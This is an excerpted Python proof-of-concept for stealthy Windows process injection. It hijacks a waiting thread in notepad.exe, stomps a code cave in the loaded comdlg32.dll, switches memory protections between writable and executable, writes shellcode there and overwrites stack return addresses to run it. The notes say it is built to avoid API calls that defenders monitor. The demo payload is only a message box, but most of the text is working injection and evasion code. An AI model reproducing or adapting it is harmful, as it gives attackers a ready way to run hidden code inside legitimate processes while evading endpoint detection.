"""
(prod) Waiting Thread Hijacking (aka Stack Bombs, Threadless Injection) - via Module Stomping
...
Note:
-----
- 'target environment' needs to be prepped -> ie open notepad.exe, and File -> Open dialog box
- this spawns threads in 'WrQueue' state, AND loads comdlg32.dll which will be 'stomped' (partially overwritten)
- comdlg32.dll is dynamically loaded, and will eventually be un-loaded to preserve system resources
    -> if script fails because module is not loaded, prep again by File -> Open dialog box (don't need to actually open any file)
...
- the original memory address in that pointer, is included at the end of shellcode, so that the parent-process execution resumes once shellcode execution completes
    --> Module Stomping deviation
    - handle to comdlg32.dll is opened, and address space of module identified
    - address space parsed for a 'code-cave' (sequential number of null-bytes the size of shellcode payload)
    - shellcode is then written to this 'code-cave'
- the stack-pointer of the original thread is then over-written (poisoned) with the address of the injected shellcode
...
This technique attempts to be more stealthy, by avoiding 'noisy' API calls such as CreateRemoteThread(), SetThreadContext(), VirtualAllocEx() etc
...
WTH Steps
---------
(order slightly changed to take into account stomping requirements)
...
- idenfity target module loaded in memory (here, we use comdlg32.dll)
- parse address space for code-cave, a large sequential number of null-bytes (b'\x00)
- shell-code written into this code-cave

Note: original memory protections likely not writable (typically READONLY)
- memory-protections modified to be WRITABLE
- shellcode written
- memory-protections AGAIN modified to be EXECUTABLE
...
psapi.EnumProcessModules.argtypes = [
    wintypes.HANDLE,                    # hProcess
    ctypes.POINTER(wintypes.HANDLE),    # [o] *lphModule, array that receives list of module handles
    wintypes.DWORD,                     # cb, size of lphModule[] (bytes)
    ctypes.POINTER(wintypes.DWORD),   # [o] lpcbNeeded, bytes required to store all handles in lphModule[]
]
psapi.EnumProcessModules.restype = wintypes.BOOL

psapi.GetModuleBaseNameW.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.HANDLE,        # hModule, handle to module
    wintypes.LPWSTR,        # [o] lpBaseName
...
# --------------- Thread/Process information and selection ---------------
            ...
            for i in range(spi.NumberOfThreads):
                ...
                if sti.ThreadState == WAITING and sti.WaitReason == WRQUEUE:
                    ...
                    if target_pid is not None:
                        ...
                        print(f"\n[+] Opening handle to target thread: OpenThread()")
...
def get_stack_boundaries(hThread: wintypes.HANDLE, hProcess: wintypes.HANDLE) -> tuple[ctypes.c_uint64, ctypes.c_uint64]:
    ...
    print(f"    -> Stack Size:  {hex(stack_size)} ({stack_size} Bytes) ")
...
def get_handle_to_loaded_module(hProcess: wintypes.HANDLE, target_dll: str) -> wintypes.HANDLE:
    """ 
    Retrieve handle to module, that is loaded in remote process
    - for notepad.exe, comdlg32.dll is a recommended target for follow-on code-cave discovery
    - it is loaded when user performs function like File -> Open dialog box
    
    Note: however it is dynamically loaded, and will eventually be unloaded to save system resources
    """

    # ---------- enumerate modules ----------
    # - double-call probe -> determine required space
    cb_size = wintypes.DWORD(0)
    psapi.EnumProcessModules(hProcess, None, 0, ctypes.byref(cb_size))

    num_modules = cb_size.value // ctypes.sizeof(wintypes.HANDLE)
    module_array = (wintypes.HANDLE * num_modules)()
    print(f"\n[+] Number of modules loaded by remote process: {num_modules}")


    # second call
    # - 'module_array' populated with array of type HMODULE (handle to a module)
    # - pointers containing 64-bit base addresses, where module is loaded in process address space
    if not psapi.EnumProcessModules(
        hProcess,
        module_array,   # .argtypes -> ctypes.POINTER(), but pointer decay points first element in array
    ...
    for i in range(num_modules):
        ...
        psapi.GetModuleBaseNameW(hProcess, module_array[i], buf, MAX_PATH)

        if buf.value.lower() == target_dll.lower():
            print(f"    -> '{buf.value}' found at {hex(module_array[i])}")
            return module_array[i]

    print(f"\n[!] Module not loaded in remote process: {target_dll}")
    raise winerr()
...
def find_code_cave(
    ...
    """ parse module's memory space, for code-cave """
    
    # ---------- retrieve module information ----------
    mi = MODULEINFO()
    if not psapi.GetModuleInformation(hProcess, hModule, ctypes.byref(mi), ctypes.sizeof(mi)):
        raise winerr()

    # determine boundaries of address space, for loaded module
    start_addr = mi.lpBaseOfDll
    end_addr = start_addr + mi.SizeOfImage
 
    # read dll memory into a local buffer for scanning
    buffer = ctypes.create_string_buffer(mi.SizeOfImage)
    if not kernel32.ReadProcessMemory(hProcess, start_addr, buffer, mi.SizeOfImage, None):
        raise winerr()

    # find code-cave, a block of null-bytes large enough for payload
    print(f"\n[+] Searching address space for code-cave: ")
    cave_offset = buffer.raw.find(b'\x00' * payload_size)
    
    if cave_offset == -1:
        raise Exception(f"[!] No cave found, Module: {module_name}, of Size: {payload_size} Bytes")

    code_cave_base_address = mi.lpBaseOfDll + cave_offset
    print(f"    -> Found, at {hex(code_cave_base_address)}")
    return code_cave_base_address




def modify_memory_permissions(hProcess: wintypes.HANDLE, lpAddress: int, dwSize: int, flNewProtect: int):
    """
    Modify memory protection value (e.g., RX -> RW or RW -> RX)
    - first VirtualQueryEx() -> VirtualProtectEx()
    - to show From: -> To: protection changes
    """
    ...
    # print old -> new modification
    old_protect = PAGE_PROTECT.get(lpflOldProtect.value, hex(lpflOldProtect.value))
    new_protect = PAGE_PROTECT.get(flNewProtect, hex(flNewProtect))
    print(f"    -> {old_protect} ----> {new_protect}")
...
with open_process(chosen_pid) as hProcess:
    ...
    #
    # ----- prepare payload -----
    # - requires discovering rsp/ripi pairs, in stack-space of worker-thread
    # - Rsp is location in stack to over-write/poison, with address of shellcode
    # - Rip is memory address to return to (in payload)
    ...
    # search thread-stack for Rsp/Rip pairs
    ...
    payload = create_payload_cowboy(hThread_worker,message_box_addr, rip_2)


    # --------------- Phase1: Allocate ---------------
    #
    # ----- module stomping -----
    # - discover code-cave, in a module loaded by target process -> destination for shellcode/payload
    print_hdr("\n>>>>    Module Stomping    <<<<\n")

    # return handle to module which will be stomped
    MODULE_NAME = 'comdlg32.dll'
    hModule = get_handle_to_loaded_module(hProcess, MODULE_NAME) 

    # find code-cave in address space of loaded module
    lpBaseAddress = find_code_cave(hProcess, hModule, MODULE_NAME, len(payload))
    ...
    old_protection = modify_memory_permissions(hProcess, lpBaseAddress, len(payload), PAGE_READWRITE)

    write_payload(hProcess, lpBaseAddress, payload)  # writing to address of code-cave in loaded module
    write_payload_verification(hProcess, lpBaseAddress, payload)

    # change memory protection
    modify_memory_permissions(hProcess, lpBaseAddress, len(payload), PAGE_EXECUTE_READ)


    # --------------- Phase3: Execute ---------------

    # Poison the stack (at multiple locations) -> redirect return address to shellcode address
    print_hdr("\n>>>>    Poisoning the stack: WriteProcessMemory()    <<<<\n")
